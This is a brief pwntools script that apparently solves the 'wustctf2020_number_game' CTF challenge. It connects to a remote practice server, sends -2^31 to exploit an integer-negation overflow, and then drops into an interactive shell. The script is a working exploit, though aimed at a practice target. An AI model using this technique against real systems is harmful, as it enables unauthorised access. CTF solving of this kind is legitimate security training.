from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wustctf2020_number_game')
io = remote('node4.buuoj.cn', 25078)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('wustctf2020_number_game')

number = - (1 << 31)
io.sendline(str(number))
io.interactive()
